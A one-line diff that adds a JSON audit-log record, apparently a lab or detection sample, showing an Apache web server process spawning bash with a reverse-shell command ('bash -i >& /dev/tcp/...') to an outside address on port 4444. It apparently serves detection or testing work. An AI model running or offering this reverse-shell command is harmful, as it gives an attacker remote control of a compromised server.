@@ -1,0 +1,1 @@
+{"type":"EXECVE","timestamp":"2026-10-18T10:27:08Z","host":"lab-host-1","uid":"www-data","pid":4321,"ppid":4100,"exe":"/bin/bash","argv":["bash","-c","bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"],"parent_exe":"/usr/sbin/apache2"}
